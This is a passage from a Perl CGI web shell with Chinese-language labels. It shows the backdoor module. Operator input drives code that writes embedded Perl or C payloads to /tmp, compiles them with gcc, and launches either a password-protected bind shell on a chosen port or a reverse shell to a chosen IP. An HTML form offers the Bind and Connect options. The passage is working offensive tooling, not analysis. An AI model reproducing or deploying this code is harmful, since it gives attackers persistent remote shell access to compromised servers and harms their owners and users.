 $bc_string="$wpath/testb.pl ".$t{'ip'}." ".$t{'port'}." &";
 $blah=system($bc_string);
 $title1="正反向连接到$t{'ip'}......."


}
}
else
{
 
if ($t{'port'}&&$t{'bind_pass'}&&($t{'use'}=="2"))
{
 open(FILE,">/tmp/testaa.c");
 print FILE $doorc;
 close(FILE);

 $blah=system("gcc -o /tmp/bd /tmp/testaa.c");
 unlink("/tmp/testaa.c");
 $bind_string="/tmp/bd ".$t{'port'}." ".$t{'bind_pass'}." &";
 $blah=system($bind_string);
 $title1="后门已打开.......";
 }

# port bind Perl 
if ($t{'port'}&&$t{'bind_pass'}&&($t{'use'}=="1"))
{
 open(FILE,">/tmp/testtest.pl");
 print FILE $doorp;
 close(FILE);

 $bind_string="perl /tmp/testtest.pl ".$t{'port'}." &";
 $blah=system($bind_string);
 $title1="后门已打开.......";
  
  }

# back connect Perl 
if ($t{'ip'} && $t{'port'} && ($t{'use'}=="1"))
{
 open(FILE,">/tmp/testb.pl");
 print FILE $backp;
 close(FILE);

 $bc_string="perl /tmp/testb.pl ".$t{'ip'}." ".$t{'port'}." &";
 $blah=system($bc_string);
 $title1="正反向连接到$t{'ip'}......."
 
}

# back connect C 
if ($t{'ip'} && $t{'port'} && ($t{'use'}=="2"))
{
open(FILE,">/tmp/testb.c");
print FILE $backc;
close(FILE);

 $blah=system("gcc -o /tmp/backc /tmp/testb.c");
 unlink("/tmp/testb.c");
 $bc_string="/tmp/backc ".$t{'ip'}." ".$t{'port'}." &";
 $blah=system($bc_string);
$title1="正反向连接到$t{'ip'}......."


}


}

print "Content-type: text/html\n\n";

print<<Backdoor;
$head
<table width=760  cellspacing=0  align=center cellpadding="3">
<tr align=center><td  bgcolor=#CCCCCC><font face=Verdana><b><div align=center>:: $title1 ::</div></b></font></td></tr>
<tr align=center><td bgcolor=#E0E0EF><font face=Verdana><b><div align=center>:: 正向连接后门 ::</div></b></font></td></tr>
<tr><td bgcolor=#E0E0E0 align=center><form name=bind method=get>
<font face=Verdana ><b>Port:</b>
<input type=text name=port size=15 value=9999 class="input">&nbsp;&nbsp;<b>Password : </b>
<input type=text name=bind_pass size=15 value=alpha class="input">&nbsp;&nbsp;<b> Use :
	<select size="1" name="use">
	<option value="1">Perl</option><option value="2">C</option>
	</select>
	<input type=hidden name=dir value=$path >
	<input type=hidden name=action value=3>
	<input type=submit name=submit value=" Bind " class="input"></font></form></td></tr>
	<tr><td bgcolor=#E0E0EF><font face=Verdana>
<b><div align=center>:: 反向连接后门 ::</div></b></font></td></tr>
	<tr><td bgcolor=#E0E0E7 align=center><form name=back method=get><font face=Verdana ><b>IP:</b> 
	<input type=text class="input" name=ip size=15 value=$ENV{REMOTE_ADDR} ><b>&nbsp;&nbsp;&nbsp;Port&nbsp;:&nbsp;</B> 
<input type=text name=port size=15 value=9999 class="input"><b>&nbsp;&nbsp;&nbsp;Use&nbsp;:&nbsp;</B>
	<select size="1" name="use">
	<option value="1">Perl</option><option value="2" >C</option>
	</select>
	<input type=hidden name=dir value=$path>
	<input type=hidden name=action value=3>
	<input type=submit name=submit value=" Connect " class="input">
	</font></form></td></tr>
		<tr><td bgcolor=#E0E0EF><font color=red>注:windows系统只能使用perl方式的后门，*nix系统可以使用所有功能!</font></td></tr>
	</font></table>
	$foot1
	</center></body></html>
Backdoor

	
###############
exit;
}

1;
exit;

#整个程序结束